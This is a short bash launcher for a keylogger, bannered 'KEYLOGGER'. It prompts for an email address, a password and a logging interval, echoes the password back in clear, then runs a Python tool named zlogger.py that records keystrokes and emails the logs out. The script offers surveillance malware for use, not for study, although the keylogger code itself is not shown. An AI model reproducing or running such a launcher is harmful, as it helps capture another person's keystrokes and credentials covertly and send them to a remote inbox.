#!/bin/bash

echo -e "\e[1;32m  ---------------KEYLOGGER-----------------"
# declare e_marray
echo Enter E-mail Address
read e_marray
echo "Your E-mail Address is "$e_marray
echo Enter Your Password
read e_pass
echo "Your Password is "$e_pass
echo Enter Time Interval Between each log \in seconds
read i_time
cd Desktop/New\ Folder/ZLogger
pwd
python zlogger.py -i $i_time -w -e $e_marray -p $e_pass -o keylog

